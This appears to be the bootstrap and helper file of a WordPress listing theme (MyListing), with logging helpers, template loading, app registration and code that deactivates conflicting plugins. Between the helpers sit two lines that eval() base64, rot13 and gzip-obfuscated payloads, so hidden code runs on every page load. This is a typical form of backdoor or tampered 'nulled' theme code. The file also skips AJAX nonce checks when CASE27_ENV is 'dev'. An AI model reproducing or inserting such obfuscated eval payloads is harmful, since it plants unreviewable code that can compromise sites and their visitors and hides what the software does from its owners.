<?php
// Debugging helper
if ( ! function_exists('mlog') ) {
	function mlog( $message = null ) {
		if ( $message !== null ) {
			return MyListing\Utils\Logger\Logger::instance()->info( $message );
		}

		return MyListing\Utils\Logger\Logger::instance();
	}
}

// Debugging helper
if ( ! function_exists('dump') ) {
	function dump() {
		call_user_func_array( [ MyListing\Utils\Logger\Logger::instance(), 'dump' ], func_get_args() );
	}
}

// Debugging helper
if ( ! function_exists('dd') ) {
	function dd() {
		call_user_func_array( [ MyListing\Utils\Logger\Logger::instance(), 'dd' ], func_get_args() );
	}
}

// Helper function for accessing mylisting\includes\app instance.
function mylisting() {
	return MyListing\Includes\App::instance();
}

// Alias for `mylisting()->helpers()`
function c27() {
	return mylisting()->helpers();
}

// locate_template wrapper, with $data parameter for
// a standard way to pass data to templates.
function mylisting_locate_template( $template, $data = [] ) {
	if ( is_array( $data ) ) {
		extract( $data );
	}

	if ( $template = locate_template( $template ) ) {
		require $template;
	}
}

function mylisting_check_ajax_referrer( $action = 'c27_ajax_nonce', $query_arg = 'security', $die = true ) {
	if ( CASE27_ENV === 'dev' ) {
		return true;
	}

	return check_ajax_referer( $action, $query_arg, $die );
}

function mylisting_custom_taxonomies( $key = 'slug', $value = 'label' ) {
	return MyListing\Ext\Custom_Taxonomies\Custom_Taxonomies::instance()->get_custom_taxonomies_list( $key, $value );
}

/**
 * Get a settings value from WP Admin > Listings > Settings.
 *
 * @since 2.0
 */
function mylisting_get_setting( $setting ) {
	return \MyListing\Src\Admin\Settings_Screen::instance()->get_setting( $setting );
}

// Start.
mylisting();

// helpers
mylisting()->register( 'cookies', MyListing\Src\Cookies::instance() );
mylisting()->register( 'helpers', MyListing\Utils\Helpers::instance() );
mylisting()->register( 'logger', MyListing\Utils\Logger\Logger::instance() );

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/**
 * Deactivate unsupported plugins.
 *
 * @since 2.1
 */
// deactivate wpjm if active
if ( class_exists( '\\WP_Job_Manager' ) ) {
	mlog()->warn( 'WP Job Manager active, deactivating...' );

	include_once ABSPATH . 'wp-admin/includes/plugin.php';
	deactivate_plugins( [ 'wp-job-manager/wp-job-manager.php' ], true );
}

// deactivate mylisting-addons if active
if ( defined( '\\CASE27_PLUGIN_DIR' ) ) {
	mlog()->warn( 'MyListing Addons active, deactivating...' );

	include_once ABSPATH . 'wp-admin/includes/plugin.php';
	deactivate_plugins( [ 'my-listing-addons/my-listing-addons.php' ], true );
}
